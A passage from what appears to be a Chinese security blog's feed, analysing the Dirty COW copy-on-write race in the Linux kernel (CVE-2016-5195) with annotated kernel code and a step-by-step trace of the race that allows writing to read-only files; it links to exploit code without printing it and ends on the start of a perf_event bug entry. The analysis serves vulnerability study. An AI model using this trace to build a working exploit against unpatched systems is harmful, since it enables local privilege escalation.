class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line">* handle_mm_fault( ) function is invoked to allocate a new page frame</span><br><span class="line">* 分配一个新的页框</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">handle_mm_fault</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> handle_pte_fault(mm, vma, address, pte, pmd, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm,</span><br><span class="line">             <span class="keyword">struct</span> vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span><br><span class="line">             pte_t *pte, pmd_t *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span><br><span class="line"></span>&#123;     </span><br><span class="line">    <span class="keyword">pte_t</span> entry;</span><br><span class="line">    <span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">    entry = *pte;</span><br><span class="line">    <span class="keyword">if</span> (!pte_present(entry)) &#123;    <span class="comment">// 如果页不在主存中</span></span><br><span class="line">        <span class="keyword">if</span> (pte_none(entry)) &#123;    <span class="comment">// 页表项内容为0，表明进程未访问过该页</span></span><br><span class="line">            <span class="keyword">if</span> (vma-&gt;vm_ops) &#123;    <span class="comment">// 如果vm_ops字段和fault字段都不为空，则说明这是一个基于文件的映射</span></span><br><span class="line">                <span class="keyword">if</span> (likely(vma-&gt;vm_ops-&gt;fault)) </span><br><span class="line">                    <span class="keyword">return</span> do_linear_fault(mm, vma, address,</span><br><span class="line">                        pte, pmd, flags, entry);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 否则分配匿名页</span></span><br><span class="line">            <span class="keyword">return</span> do_anonymous_page(mm, vma, address, pte, pmd, flags);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 属于非线性文件映射且已被换出</span></span><br><span class="line">        <span class="keyword">if</span> (pte_file(entry))</span><br><span class="line">            <span class="keyword">return</span> do_nonlinear_fault(mm, vma, address,</span><br><span class="line">                    pte, pmd, flags, entry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 页不在主存中，但是页表项保存了相关信息，则表明该页被内核换出，则要进行换入操作</span></span><br><span class="line">        <span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">                    pte, pmd, flags, entry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptl = pte_lockptr(mm, pmd);</span><br><span class="line">    spin_lock(ptl);</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!pte_same(*pte, entry)))</span><br><span class="line">        <span class="keyword">goto</span> unlock;</span><br><span class="line">    <span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;    <span class="comment">//异常由写访问触发,follow_page后会设置该flag</span></span><br><span class="line">        <span class="keyword">if</span> (!pte_write(entry))    <span class="comment">// 对应的页是不可写的</span></span><br><span class="line">            <span class="keyword">return</span> do_wp_page(mm, vma, address, pte, pmd, ptl, entry); <span class="comment">// 此时必须进行写时复制的操作，以后再访问这块虚拟地址，就访问的是原数据的拷贝了。</span></span><br><span class="line"></span><br><span class="line">        entry = pte_mkdirty(entry);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不进行写时复制</span></span><br><span class="line">    entry = pte_mkyoung(entry);</span><br><span class="line">    <span class="keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;</span><br><span class="line">        update_mmu_cache(vma, address, pte);</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">unlock:</span><br><span class="line">    pte_unmap_unlock(pte, ptl);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// do_linear_fault -&gt; __do_fault vma -&gt; vm_ops-&gt;fault -&gt; filemap_fault -&gt; return ret | VM_FAULT_LOCKED。</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_linear_fault</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> address, pte_t *page_table, pmd_t *pmd,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, pte_t orig_pte)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">            - vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line">    <span class="comment">// 如果page_table之前用来建立了临时内核映射，则释放该映射 </span></span><br><span class="line">    pte_unmap(page_table);</span><br><span class="line">    <span class="keyword">return</span> __do_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __do_fault(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span><br><span class="line">        <span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用定义好的fault函数，分配一个新页面 ,确保将所需的文件数据读入到映射页</span></span><br><span class="line">    ret = vma-&gt;vm_ops-&gt;fault(vma, &amp;vmf);</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 1. cow, 3. pass</span></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;    <span class="comment">// 写访问</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED)) &#123; <span class="comment">// 私有映射，此空间是MAP_PRIVATE标志, 则要创建一个副本进行写时复制 </span></span><br><span class="line">            page = cow_page;</span><br><span class="line">            anon = <span class="number">1</span>;    <span class="comment">// 标记为一个匿名映射</span></span><br><span class="line">            copy_user_highpage(page, vmf.page, address, vma); <span class="comment">// 创建新页</span></span><br><span class="line">            __SetPageUptodate(page);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (likely(pte_same(*page_table, orig_pte))) &#123;</span><br><span class="line">        flush_icache_page(vma, page);</span><br><span class="line">        entry = mk_pte(page, vma-&gt;vm_page_prot);    <span class="comment">// 按新页生成pte entry</span></span><br><span class="line">        <span class="comment">// 3. pass</span></span><br><span class="line">        <span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE)    <span class="comment">// 将此页置可写，以避免其他路径也触发COW</span></span><br><span class="line">            entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line">                ...</span><br><span class="line">        set_pte_at(mm, address, page_table, entry);    <span class="comment">// 设置到页表 </span></span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> pte_t <span class="title">maybe_mkwrite</span><span class="params">(pte_t pte, <span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (likely(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">        pte = pte_mkwrite(pte);</span><br><span class="line">    <span class="keyword">return</span> pte;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ext4中定义的缺页异常处理函数</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">struct</span> vm_operations_struct ext4_file_vm_ops = &#123;</span><br><span class="line">    .fault      = filemap_fault,</span><br><span class="line">    .page_mkwrite   = ext4_page_mkwrite,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> * filemap_fault - read in file data for page fault handling</span><br><span class="line"> * ...</span><br><span class="line"> * filemap_fault() is invoked via the vma operations vector for a</span><br><span class="line"> * mapped memory region to read in file data during a page fault.</span><br><span class="line"> * ...</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filemap_fault</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma, <span class="keyword">struct</span> vm_fault *vmf)</span></span><br><span class="line"></span>&#123;   </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这个函数做的第一件事情就是检查要访问的地址偏移（相对于文件的）是否超过了文件大小，</span></span><br><span class="line">    <span class="comment">// 如果超过就返回VM_FAULT_SIGBUS，这将导致SIGBUS信号被发送给进程。</span></span><br><span class="line">    size = (i_size_read(inode) + PAGE_CACHE_SIZE - <span class="number">1</span>) &gt;&gt; PAGE_CACHE_SHIFT;</span><br><span class="line">    <span class="keyword">if</span> (offset &gt;= size)</span><br><span class="line">        <span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过find_get_page()速查一个文件地址（inode）在文件缓存中的页。</span></span><br><span class="line">    page = find_get_page(mapping, offset);</span><br><span class="line">    ...</span><br><span class="line">    vmf-&gt;page = page;</span><br><span class="line">    <span class="keyword">return</span> ret | VM_FAULT_LOCKED;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_wp_page</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> address, pte_t *page_table, pmd_t *pmd,</span><br><span class="line">        spinlock_t *ptl, pte_t orig_pte)</span></span><br><span class="line">    __<span class="title">releases</span><span class="params">(ptl)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/*</span><br><span class="line">    // 获取共享页</span><br><span class="line">    old_page = vm_normal_page(vma, address, orig_pte);</span><br><span class="line">    if (!old_page) &#123; //获取共享页失败  </span><br><span class="line">        // 如果vma的映射本来就是共享且可写的，则跳转至reuse直接使用orig_pte对应的页</span><br><span class="line">        if ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">                     (VM_WRITE|VM_SHARED))</span><br><span class="line">            goto reuse;</span><br><span class="line">        // 否则跳转至gotten分配一个页</span><br><span class="line">        goto gotten;</span><br><span class="line">    &#125;</span><br><span class="line">*/</span></span><br><span class="line">    <span class="comment">// 2.</span></span><br><span class="line">    <span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// 内核通过检查，发现COW操作已经在缺页处理时完成了，所以不再进行COW，而是直接利用之前COW得到的页表项</span></span><br><span class="line">        <span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">            <span class="comment">/*</span><br><span class="line">             * The page is all ours.  Move it to our anon_vma so</span><br><span class="line">             * the rmap code will not search our parent or siblings.</span><br><span class="line">             * Protected against the rmap code by the page lock.</span><br><span class="line">             */</span></span><br><span class="line">            page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">            unlock_page(old_page);</span><br><span class="line">            <span class="keyword">goto</span> reuse;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">reuse:</span><br><span class="line">    flush_cache_page(vma, address, pte_pfn(orig_pte));</span><br><span class="line">    entry = pte_mkyoung(orig_pte);</span><br><span class="line">    entry = maybe_mkwrite(pte_mkdirty(entry), vma);     <span class="comment">// mark the page dirty</span></span><br><span class="line">    <span class="keyword">if</span> (ptep_set_access_flags(vma, address, page_table, entry,<span class="number">1</span>))</span><br><span class="line">        update_mmu_cache(vma, address, page_table);</span><br><span class="line">    pte_unmap_unlock(page_table, ptl);</span><br><span class="line">    ret |= VM_FAULT_WRITE;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"><span class="comment">/*</span><br><span class="line">gotten:</span><br><span class="line">    pte_unmap_unlock(page_table, ptl);</span><br><span class="line"></span><br><span class="line">    if (unlikely(anon_vma_prepare(vma)))</span><br><span class="line">        goto oom;</span><br><span class="line"></span><br><span class="line">    if (is_zero_pfn(pte_pfn(orig_pte))) &#123;   // 分配一个零页面  </span><br><span class="line">        new_page = alloc_zeroed_user_highpage_movable(vma, address);</span><br><span class="line">        if (!new_page)</span><br><span class="line">            goto oom;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);  //分配一个非零页面</span><br><span class="line">        if (!new_page)</span><br><span class="line">            goto oom;</span><br><span class="line">        cow_user_page(new_page, old_page, address, vma); //将old_page中的数据拷贝到new_page</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">        new_page = old_page;</span><br><span class="line">        ret |= VM_FAULT_WRITE;</span><br><span class="line">    &#125; </span><br><span class="line">    return ret;</span><br><span class="line">*/</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="触发逻辑">触发逻辑</h2><p>__get_user_pages中while循环触发漏洞，总共四个循环调用流程如下：</p>
<p>1.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">follow_page() <span class="comment">// 满足(!pte_present(pte)) &amp;&amp; (!pte_none(pte)) 返回NULL</span></span><br><span class="line">进入循环：</span><br><span class="line">handle_mm_fault</span><br><span class="line">    -&gt; __handle_mm_fault</span><br><span class="line">        -&gt; handle_pte_fault  <span class="comment">// 满足(!pte_present(entry)) &amp;&amp; (pte_none(entry)) &amp;&amp; (vma-&gt;vm_ops)</span></span><br><span class="line">            -&gt; do_linear_fault</span><br><span class="line">                -&gt; __do_fault</span><br><span class="line">                    -&gt; vma-&gt;vm_ops-&gt;fault(vma, &amp;vmf)  <span class="comment">// filemap_fault() return VM_FAULT_LOCKED</span></span><br><span class="line">                    -&gt; copy_user_highpage  <span class="comment">// cow</span></span><br><span class="line">                    -&gt; maybe_mkwrite(pte_mkdirty(entry), vma) <span class="comment">// mark the page dirty, RO</span></span><br><span class="line">                    <span class="keyword">return</span> VM_FAULT_LOCKED</span><br></pre></td></tr></table></figure></p>
<p>2.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">follow_page() <span class="comment">// 满足((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) 返回NULL</span></span><br><span class="line">进入循环：</span><br><span class="line">handle_mm_fault</span><br><span class="line">    -&gt; __handle_mm_fault </span><br><span class="line">        -&gt; handle_pte_fault  <span class="comment">// 满足(flags &amp; FAULT_FLAG_WRITE) &amp;&amp; (!pte_write(entry))</span></span><br><span class="line">            -&gt; do_wp_page()</span><br><span class="line">                -&gt; PageAnon()  <span class="comment">// this is CoWed page already</span></span><br><span class="line">                -&gt; reuse_swap_page(old_page)</span><br><span class="line">                -&gt; maybe_mkwrite(pte_mkdirty(entry), vma) <span class="comment">// mark the page dirty, RO again</span></span><br><span class="line">                <span class="keyword">return</span> VM_FAULT_WRITE</span><br></pre></td></tr></table></figure></p>
<p>满足 ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))则去掉FOLL_WRITE标志</p>
<p>3.<br>get_user_pages第三次调用follow_page进行寻页，如果这时Thread2通过madvise(map, DONT_NEED)通知内核map在接下来不会被使用，内核会将map所在页释放，这样在寻页的时候就会引发pagefault，<br>此时的FOLL_WRITE已被置为0，fault_flags也不再拥有FAULT_FLAG_WRITE标志，<br>也就是在寻页的时候不再需要页具有写权限，所以不会产生COW。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cond_resched -&gt; different thread will now unmap via madvise</span><br><span class="line">follow_page() // 满足(!pte_present(pte)) &amp;&amp; (!pte_none(pte)) 返回NULL</span><br><span class="line">进入循环：</span><br><span class="line">handle_mm_fault</span><br><span class="line">    -&gt; __handle_mm_fault </span><br><span class="line">        -&gt; handle_pte_fault  // 满足(!pte_present(entry)) &amp;&amp; (pte_none(entry)) &amp;&amp; (vma-&gt;vm_ops)</span><br><span class="line">            -&gt; do_linear_fault</span><br><span class="line">                -&gt; __do_fault</span><br><span class="line">                    -&gt; vma-&gt;vm_ops-&gt;fault(vma, &amp;vmf)  // filemap_fault() return VM_FAULT_LOCKED</span><br><span class="line">                    -&gt; // pass copy_user_highpage  // cow</span><br><span class="line">                    -&gt; mk_pte(page, vma-&gt;vm_page_prot);</span><br></pre></td></tr></table></figure>
<p>4.<br>第四次调用follow_page进行寻页的话，会成功返回对应的页表项，<br>接下来的写入操作会被同步到只读的文件中，从而造成了越权写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">follow_page()</span><br><span class="line">    -&gt; (!pte_present(pte))  <span class="comment">// pass</span></span><br><span class="line">    -&gt; ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte))  <span class="comment">// has delete FOLL_WRITE flag, pass</span></span><br><span class="line">    -&gt; page = vm_normal_page(vma, address, pte);  <span class="comment">// return page;</span></span><br></pre></td></tr></table></figure>
<p>四个循环伪代码表示为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line"> * 1.</span><br><span class="line"> * follow_page 满足(!pte_present(pte)) &amp;&amp; (!pte_none(pte))，返回NULL，进入循环</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">while</span> (!(page = follow_page())) </span><br><span class="line">&#123;</span><br><span class="line">    handle_mm_fault() </span><br><span class="line">    &#123;</span><br><span class="line">        __handle_mm_fault()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// handle_pte_fault 满足(!pte_present(entry)) &amp;&amp; (pte_none(entry)) &amp;&amp; (vma-&gt;vm_ops)</span></span><br><span class="line">            handle_pte_fault()  </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ((!pte_present(entry)) &amp;&amp; (pte_none(entry)) &amp;&amp; (vma-&gt;vm_ops))</span><br><span class="line">                &#123;    do_linear_fault()</span><br><span class="line">                    &#123;</span><br><span class="line">                        __do_fault() </span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">// call filemap_fault() return ret | VM_FAULT_LOCKED</span></span><br><span class="line">                            ret = vma-&gt;vm_ops-&gt;fault(vma, &amp;vmf);</span><br><span class="line">                            <span class="comment">// cow</span></span><br><span class="line">                            copy_user_highpage(); </span><br><span class="line">                            <span class="comment">// mark the page dirty, RO</span></span><br><span class="line">                            maybe_mkwrite(pte_mkdirty(entry), vma)</span><br><span class="line">                            <span class="comment">// VM_FAULT_LOCKED</span></span><br><span class="line">                            <span class="keyword">return</span> ret;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> * 2.</span><br><span class="line"> * follow_page 满足((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) 返回NULL，进入循环</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">while</span> (!(page = follow_page())) </span><br><span class="line">&#123;</span><br><span class="line">    handle_mm_fault() </span><br><span class="line">    &#123;</span><br><span class="line">        __handle_mm_fault()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 满足(flags &amp; FAULT_FLAG_WRITE) &amp;&amp; (!pte_write(entry))</span></span><br><span class="line">            handle_pte_fault()  </span><br><span class="line">            &#123;</span><br><span class="line">                do_wp_page()</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// this is CoWed page already</span></span><br><span class="line">                    <span class="keyword">if</span> (PageAnon())</span><br><span class="line">                    &#123;</span><br><span class="line">                        reuse_swap_page(old_page);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// mark the page dirty, RO again</span></span><br><span class="line">                    maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line">                    <span class="keyword">return</span> ret | VM_FAULT_WRITE</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE)) </span><br><span class="line">    &#123;</span><br><span class="line">        foll_flags &amp;= ~FOLL_WRITE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> * 3.</span><br><span class="line"> * cond_resched -&gt; different thread will now unmap via madvise</span><br><span class="line"> * follow_page 满足(!pte_present(pte)) &amp;&amp; (!pte_none(pte)) 返回NULL，进入循环</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">while</span> (!(page = follow_page())) </span><br><span class="line">&#123;</span><br><span class="line">    handle_mm_fault() </span><br><span class="line">    &#123;</span><br><span class="line">        __handle_mm_fault()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 满足(!pte_present(entry)) &amp;&amp; (pte_none(entry)) &amp;&amp; (vma-&gt;vm_ops)</span></span><br><span class="line">            handle_pte_fault()  </span><br><span class="line">            &#123;</span><br><span class="line">                do_linear_fault()</span><br><span class="line">                &#123;</span><br><span class="line">                    __do_fault()</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// filemap_fault() return VM_FAULT_LOCKED</span></span><br><span class="line">                        vma-&gt;vm_ops-&gt;fault(vma, &amp;vmf);</span><br><span class="line">                        <span class="comment">// pass cow: copy_user_highpage</span></span><br><span class="line">                        mk_pte(page, vma-&gt;vm_page_prot);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> * 4.</span><br><span class="line"> */</span></span><br><span class="line">follow_page()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// pass </span></span><br><span class="line">    <span class="keyword">if</span> (!pte_present(pte))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// has delete FOLL_WRITE flag, pass</span></span><br><span class="line">    <span class="keyword">if</span> (((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// return page;</span></span><br><span class="line">    page = vm_normal_page(vma, address, pte);</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="利用">利用</h2><ol>
<li><a href="https://github.com/dirtycow/dirtycow.github.io" target="_blank" rel="external">dirtycow.github.io</a></li>
<li>先绕过selinux吧。</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>你们这些人啊，每年年底都想搞个大新闻。。。</p>
<p>Linux内核 &gt;= 2.6.22（2007年发行）以后的版本都受到影响，同时影响到android系统。</p>
<p>Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞。</p>]]>
    
    </summary>
    
      <category term="cve" scheme="http://blog.idhyt.com/tags/cve/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[PERF_EVENT VUL]]></title>
    <link href="http://blog.idhyt.com/2016/09/04/exploit-perf_event-vul/"/>
    <id>http://blog.idhyt.com/2016/09/04/exploit-perf_event-vul/</id>
    <published>2016-09-04T14:29:11.000Z</published>
    <updated>2016-11-10T05:24:35.000Z</updated>
    <content type="html"><![CDATA[<h2 id="cve-2016-3768">cve-2016-3768</h2><p>Due to the duplicate constraints, arch/arm/mach-msm/perf_event_msm_krait_l2.c<br>drivers marks the event as OFF but returns TRUE to perf_event.c which<br>goes ahead and allocates the hw_event and enables it.</p>
<p>Since event is marked OFF, kernel events core will try to enable this event<br>again during next perf_event_enable. Which results in same event enabled<br>on multiple hw_events. But during the perf_release, event struct is freed<br>and only one hw_event is released. This results in dereferencing the<br>invalid pointer and hence the crash.</p>
<a id="more"></a>
<p>crash and my kernel log</p>
